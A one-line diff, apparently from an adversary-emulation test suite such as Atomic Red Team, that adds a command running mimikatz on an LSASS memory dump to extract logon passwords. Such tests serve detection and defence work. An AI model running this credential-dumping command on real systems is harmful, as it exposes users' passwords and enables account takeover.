@@ -1,0 +1,1 @@
+"PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe" "sekurlsa::minidump %tmp%\lsass.DMP" "sekurlsa::logonpasswords full" exit
